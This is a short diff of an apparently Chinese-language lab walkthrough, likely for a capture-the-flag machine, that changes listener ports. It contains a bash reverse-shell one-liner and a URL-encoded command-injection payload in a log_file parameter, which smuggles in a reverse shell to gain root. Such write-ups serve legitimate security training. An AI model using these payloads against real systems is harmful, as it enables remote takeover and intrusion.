@@ -266,11 +266,11 @@ amay@sea:~$ ls -la /tmp/test.txt
 ### 使用的是root，可以注入反弹shell
 
 ```
-bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.16.19/4445 0>&1'
 ```
 #### 按ctrl + U
 ```
-log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.149/4443+0>%261'&analyze_log=
+log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.149/4445+0>%261'&analyze_log=
 ```
 #### 发起监听
 ```
